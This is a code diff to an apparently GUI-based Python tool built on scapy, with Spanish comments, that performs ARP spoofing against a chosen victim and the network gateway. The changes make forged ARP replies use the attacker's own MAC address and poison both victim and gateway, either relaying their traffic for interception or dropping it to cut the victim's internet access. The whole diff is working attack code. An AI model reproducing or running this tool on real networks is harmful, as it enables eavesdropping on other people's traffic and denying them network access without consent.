@@ -14,6 +14,7 @@ from tkinter import scrolledtext, messagebox
 from scapy.layers.l2 import ARP, Ether
 from scapy.sendrecv import send, srp, sendp
 from scapy.config import conf
+from scapy.arch import get_if_hwaddr
 
 stop_attack = False
 hosts_data = []
@@ -32,13 +33,15 @@ def get_mac(ip, retries=3):
             return answered[0][1].hwsrc
     return None
 
-def spoof(target_ip, spoof_ip, target_mac, spoof_mac):
+def spoof(target_ip, spoof_ip, target_mac):
+    # hwsrc usa SIEMPRE nuestra MAC real
+    my_mac = get_if_hwaddr(conf.iface)
     packet = Ether(dst=target_mac) / ARP(
         op=2,
         pdst=target_ip,
         hwdst=target_mac,
         psrc=spoof_ip,
-        hwsrc=spoof_mac
+        hwsrc=my_mac
     )
     sendp(packet, verbose=False)
 
@@ -97,21 +100,23 @@ def attack_loop(target_ip, target_mac, gateway_ip, gateway_mac, cut_internet):
     stop_attack = False
 
     if cut_internet:
-        disable_ip_forwarding()  # No reenviar tráfico
+        disable_ip_forwarding()
     else:
-        enable_ip_forwarding()   # MITM con tráfico pasando
+        enable_ip_forwarding()
 
     log(f"[+] Iniciando ARP spoofing contra {target_ip} ({target_mac})")
 
     while not stop_attack:
         if cut_internet:
-            # Solo envenena a la víctima, no al gateway
-            spoof(target_ip, gateway_ip, target_mac, gateway_mac)
+            # Envenenar víctima para que crea que el gateway es mi MAC
+            spoof(target_ip, gateway_ip, target_mac)
+            # Envenenar gateway para que crea que la víctima es mi MAC
+            spoof(gateway_ip, target_ip, gateway_mac)
         else:
-            # MITM: envenena en ambos sentidos
-            spoof(target_ip, gateway_ip, target_mac, gateway_mac)
-            spoof(gateway_ip, target_ip, gateway_mac, target_mac)
-        time.sleep(0.3)  # Intervalo más rápido
+            # MITM: ambos creen que yo soy el otro
+            spoof(target_ip, gateway_ip, target_mac)
+            spoof(gateway_ip, target_ip, gateway_mac)
+        time.sleep(0.3)
 
     log("[*] Ataque detenido. Restaurando red...")
     restore(target_ip, gateway_ip)
